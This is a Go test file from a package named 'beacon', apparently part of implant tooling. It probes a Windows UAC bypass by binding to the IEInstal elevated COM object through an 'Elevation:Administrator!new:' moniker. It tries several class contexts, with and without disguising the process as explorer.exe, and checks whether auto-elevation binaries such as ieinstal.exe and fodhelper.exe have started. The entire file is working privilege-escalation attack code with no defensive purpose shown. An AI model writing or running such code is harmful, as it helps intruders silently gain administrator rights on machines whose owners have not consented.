package beacon

import (
	"fmt"
	"os/exec"
	"runtime"
	"strings"
	"syscall"
	"testing"
	"time"
	"unsafe"
)

func TestDbgIEBind(t *testing.T) {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	procCoInitializeEx.Call(0, 2)
	defer procCoUninitialize.Call()

	iidUnk, _ := guidFromString("00000000-0000-0000-C000-000000000046")
	monPtr, _ := syscall.UTF16PtrFromString("Elevation:Administrator!new:{BDB57FF2-79B9-4205-9447-F5FE85F37312}")

	procs := func() string {
		out, _ := exec.Command("tasklist", "/fo", "csv", "/nh").Output()
		var hits []string
		for _, line := range strings.Split(string(out), "\n") {
			if strings.Contains(line, "ieinstal.exe") || strings.Contains(line, "fodhelper.exe") {
				hits = append(hits, strings.Trim(line, " \r\n"))
			}
		}
		return strings.Join(hits, " | ")
	}

	for _, mask := range []bool{false, true} {
		for _, ctx := range []uintptr{0x4, 0x15, 0} {
			if mask {
				restore, err := masqueradeExplorer()
				if err != nil {
					t.Fatalf("masquerade: %v", err)
				}
				defer restore()
			}
			var p unsafe.Pointer
			var r1 uintptr
			if ctx != 0 {
				b := bindOpts3{cbStruct: uint32(unsafe.Sizeof(bindOpts3{})), dwClassContext: uint32(ctx)}
				r1, _, _ = procCoGetObject.Call(uintptr(unsafe.Pointer(monPtr)), uintptr(unsafe.Pointer(&b)), uintptr(unsafe.Pointer(&iidUnk)), uintptr(unsafe.Pointer(&p)))
			} else {
				r1, _, _ = procCoGetObject.Call(uintptr(unsafe.Pointer(monPtr)), 0, uintptr(unsafe.Pointer(&iidUnk)), uintptr(unsafe.Pointer(&p)))
			}
			time.Sleep(1500 * time.Millisecond)
			t.Logf("IEInstal IUnknown mask=%-5v ctx=0x%-3x -> 0x%08x p=%p | %s", mask, ctx, uint32(r1), p, procs())
			if p != nil {
				comRelease(p)
			}
		}
	}
	fmt.Println("done")
}
